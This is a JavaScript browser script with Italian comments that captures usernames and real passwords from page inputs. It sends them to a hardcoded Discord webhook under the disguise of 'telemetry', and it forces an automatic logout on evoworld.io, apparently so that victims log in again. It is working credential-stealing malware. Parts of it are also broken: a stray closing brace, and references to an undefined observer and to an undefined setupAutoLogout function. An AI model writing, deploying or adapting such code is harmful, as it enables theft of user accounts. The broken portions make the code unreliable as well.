const DEBUG = false;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1";

const log = (...args) => DEBUG && console.log(...args);
const warn = (...args) => DEBUG && console.warn(...args);
const err = (...args) => DEBUG && console.error(...args);

let lastTextInput = null;
let lastPasswordInput = null;
let logoutDone = false;

const lastValues = new WeakMap();

// Aggiorna input
function updateValue(input) {
  lastValues.set(input, input.value || "");
  if (input.type === "text" && input.value) lastTextInput = input;
  if (input.type === "password" && input.value) lastPasswordInput = input;
}

// Scansiona tutti gli input della pagina
function scanInputs() {
  document.querySelectorAll("input").forEach(updateValue);
}

// Invia i dati al webhook
async function sendTelemetry(method) {
  const username = lastTextInput?.value.trim() || "";
  const password = lastPasswordInput?.value || "";

  if (!username && !password) return;

  const payload = {
    event: "login_submit",
    username,
    username_length: username.length,
    password, // qui la password reale
    method,
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```" })
    });
    log("Telemetry sent:", payload);
  } catch (e) {
    err("Telemetry error:", e);
  }
}

// Eventi per tracciare input e login
document.addEventListener("input", e => e.target.tagName === "INPUT" && updateValue(e.target));
document.addEventListener("change", e => e.target.tagName === "INPUT" && updateValue(e.target));
document.addEventListener("paste", e => e.target.tagName === "INPUT" && updateValue(e.target));
document.addEventListener("focusin", e => {
  if (e.target.tagName !== "INPUT") return;
  if (e.target.type === "text") lastTextInput = e.target;
  if (e.target.type === "password") lastPasswordInput = e.target;
});

// Invio al premere Enter o click su login
document.addEventListener("keydown", e => { if (e.key === "Enter") sendTelemetry("enter"); });
document.addEventListener("click", e => {
  const btn = e.target.closest("button");
  if (btn && btn.textContent?.trim().toLowerCase() === "login") sendTelemetry("click_login");
});

// ---- Auto Logout evoworld.io ----

// variabili GLOBALI sicure
if (window.logoutDone === undefined) {
  window.logoutDone = false;
}

if (window.autoLogoutInterval) {
  clearInterval(window.autoLogoutInterval);
}

window.autoLogoutInterval = setInterval(function () {
  if (window.logoutDone) return;

  var logoutBtn =
    document.querySelector('button.logout') ||
    document.querySelector('a.logout') ||
    document.querySelector('#logout') ||
    document.querySelector('[onclick*="logout"]');

  if (logoutBtn) {
    logoutBtn.click();
    window.logoutDone = true;
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout automatico eseguito");
  }
}, 1000);

  // Timeout di sicurezza
  setTimeout(() => {
    if (!window.logoutDone) {
      observer.disconnect();
      log("Auto logout timeout reached");
    }
  }, 30000);

  window.autoLogoutObserver = observer;
}

// Avvio script
window.addEventListener("DOMContentLoaded", () => {
  scanInputs();
  setTimeout(scanInputs, 300);
  setTimeout(scanInputs, 800);
  setupAutoLogout();
});

// Scan periodico per input dinamici
setInterval(scanInputs, 500);
